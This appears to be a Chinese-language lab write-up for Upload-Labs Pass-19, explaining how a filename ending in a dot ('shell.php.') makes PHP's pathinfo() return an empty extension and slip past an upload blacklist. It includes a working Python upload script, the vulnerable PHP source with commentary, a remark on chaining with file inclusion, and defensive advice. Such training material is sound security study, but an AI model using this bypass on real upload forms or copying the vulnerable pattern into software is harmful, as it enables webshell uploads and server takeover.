Upload-Labs Pass-19

2026年9月27日 Upload-Labs Web安全 文件上传 代码审计

一、题目信息

  • 题目名称：Upload-Labs Pass-19 (pathinfo 逻辑绕过)
  • 题目平台：Upload-Labs 本地靶场
  • 题目类型：Web安全 / 文件上传漏洞 / 黑名单绕过 / 代码审计
  • 靶场链接：http://localhost:8082/Pass-19/index.php（本地环境）
  • 涉及工具：Python (requests库)

二、解题步骤

1. 分析题目考什么

本题的核心考点是代码审计与函数逻辑漏洞。后端使用 pathinfo() 函数来获取文件后缀。通过审计源码可以发现，文件名完全由 POST 参数 save_name 控制，且该函数在处理末尾带点号的文件名（如 shell.php.）时，会返回空字符串 ""，导致黑名单检测失效，最终文件被原样保存。

2. 怎么想（破题思路）

  • 查看源码，发现 save_name 参数完全可控，并且路径拼接时直接使用了该参数。
  • 构造文件名 shell.php.（末尾加点），利用 pathinfo 的解析逻辑绕过黑名单。
  • 配合图片马 shell.jpg 绕过可能存在的图片内容检测。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：Mac 环境无法解析 .php. 后缀

踩坑情况：文件上传成功后，访问 shell.php. 时页面没有执行 PHP，而是显示了源码或 404。

原因分析：Mac 和 Linux 下的 PHP 解析器默认不认识以点号结尾的文件。但这不影响靶场通关逻辑，只要文件落地成功即视为绕过成功。

改进方式：在真实渗透中，如果目标环境是 Windows（IIS 或 Apache），.php. 会被作为 PHP 脚本解析。在本靶场，看到“上传成功”和 ../upload/shell.php. 路径即可通关。

详细实操步骤（Payload逐字解释）

第一步：编写 Python 脚本

import requests
import re

url = "http://localhost:8082/Pass-19/index.php"

# 核心作弊点：save_name 参数末尾加一个点号
# 绕过 pathinfo 解析，让 file_ext 变成空字符串
data = {
    'save_name': 'shell.php.',  # 关键
    'submit': 'Submit'
}

files = {
    'upload_file': ('shell.jpg', open('shell.php', 'rb'), 'image/jpeg')
}

response = requests.post(url, files=files, data=data)
print(response.text)

match = re.search(r'\.\./upload/(\S+)"', response.text)
if match:
    print(f"\n[+] 上传成功！真实文件路径为: /upload/{match.group(1)}")

逐字解析：

  • save_name='shell.php.'：利用末尾点号欺骗 pathinfo()，绕过黑名单。
  • 'shell.jpg'：上传的伪装文件，用于通过图片内容检测。

第二步：验证

运行脚本后，终端输出 [+] 上传成功！真实文件路径为: /upload/shell.php.，证明逻辑绕过成功。

4. 怎么迁移（跨领域联想）

  • 代码审计的重要性：Pass-19 完全是一道“源码阅读题”。不审计源码，你根本不知道 pathinfo 会被点号欺骗。在真实的代码审计中，要特别留意字符串处理函数（如 pathinfo、basename、explode）的边界情况。
  • 黑名单的终结：从 Pass-03 到 Pass-19，黑名单被各种方式绕过（大小写、空格、点号、双写、数据流）。这再次证明：白名单+文件重命名+服务器权限控制才是终极解决方案。
  • 环境差异与靶场评分：Mac 环境不能解析 .php. 属于环境限制，不影响靶场的评分逻辑。在靶场中，绕过检测就是胜利。

三、源码逐行深度解读（核心复盘）

源码逻辑逐行解析

我们将后端代码逐行拆解，找出漏洞发生的根本原因：

1.  $is_upload = false;
2.  $msg = null;
3.  if (isset($_POST['submit'])) {
4.      if (file_exists(UPLOAD_PATH)) {
5.          $deny_ext = array("php", "php5", "php4", "php3", "php2", "html", "htm", "phtml", "pht", ...); // 黑名单
6.          
7.          $file_name = $_POST['save_name']; // 漏洞点1：文件名完全可控
8.          $file_ext = pathinfo($file_name, PATHINFO_EXTENSION); // 漏洞点2：解析缺陷
9.          
10.         if (!in_array($file_ext, $deny_ext)) { // 漏洞点3：黑名单绕过
11.             $temp_file = $_FILES['upload_file']['tmp_name'];
12.             $img_path = UPLOAD_PATH . '/' . $file_name; // 漏洞点4：原样保存
13.             if (move_uploaded_file($temp_file, $img_path)) {
14.                 $is_upload = true;
15.             } else {
16.                 $msg = '上传出错！';
17.             }
18.         } else {
19.             $msg = '禁止保存为该类型文件！';
20.         }
21.     } else {
22.         $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
23.     }
24. }

漏洞点详解：

  • 第7行：后端没有对 $_POST['save_name'] 进行任何过滤，直接接收用户输入作为文件名。
  • 第8行（核心漏洞）：pathinfo('shell.php.', PATHINFO_EXTENSION) 的结果是空字符串 ""。因为 pathinfo 在处理时，认为最后一个点后面是空的，所以返回了空后缀。
  • 第10行：in_array("", $deny_ext) 返回 false。空字符串不在黑名单里，条件成立，绕过成功。
  • 第12行：拼接路径时使用了原始文件名 shell.php.，最终文件被成功保存为 shell.php.。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Pass-14 的区别：Pass-14 利用图片文件头检测漏洞（内容级）。Pass-19 利用 pathinfo 函数的解析逻辑缺陷（文件名级）。
  • 与 Pass-10 的区别：Pass-10 是双写绕过（替换逻辑漏洞）。Pass-19 是利用函数对特殊字符的处理逻辑。

2. 这种题目的出现原因（为什么存在）

开发者试图通过 pathinfo 来提取后缀，然后扔进黑名单。但他们没有考虑到 pathinfo 处理异常文件名（末尾带点）时的行为。这警示我们：安全防御不能依赖函数的默认行为，必须进行严格的输入规范化处理。

3. 这种应用在实际中如何体现？

在实战中，如果遇到文件上传结合文件包含漏洞（LFI），攻击者甚至可以上传 shell.php. 再利用 LFI 包含它。防御方应使用白名单，并在保存文件时对文件名进行重命名。

4. 如何抽象理解概念（大白话）

把靶场比作一个“查岗的门卫”：

  • Pass-19 的门卫只检查你的后缀是不是“刀（.php）”。
  • 你把名字写成“刀（.php.）”，门卫用他的识字卡（pathinfo）一查，卡上显示“无后缀”，于是放行。
  • 但实际上，你的刀还在身上，只是名字多带了个标点符号而已。
